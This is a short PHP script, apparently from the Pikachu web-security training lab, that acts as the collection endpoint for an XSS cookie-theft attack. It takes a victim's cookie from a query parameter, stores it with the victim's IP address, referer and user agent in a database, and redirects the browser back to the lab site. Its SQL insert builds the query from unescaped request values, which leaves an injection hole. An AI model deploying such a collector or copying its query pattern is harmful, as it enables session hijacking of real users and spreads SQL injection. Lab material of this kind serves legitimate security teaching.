<?php
include_once '../inc/config.inc.php';
include_once '../inc/mysql.inc.php';
$link=connect();

//ThisIsObtaincookieOfapiPage

if(isset($_GET['cookie'])){
    $time=date('Y-m-d g:i:s');
    $ipaddress=getenv ('REMOTE_ADDR');
    $cookie=$_GET['cookie'];
    $referer=$_SERVER['HTTP_REFERER'];
    $useragent=$_SERVER['HTTP_USER_AGENT'];
    $query="insert cookies(time,ipaddress,cookie,referer,useragent) 
    values('$time','$ipaddress','$cookie','$referer','$useragent')";
    $result=mysqli_query($link, $query);
}
header("Location:http://192.168.1.4/pikachu/index.php");//AgainToOneOf

?>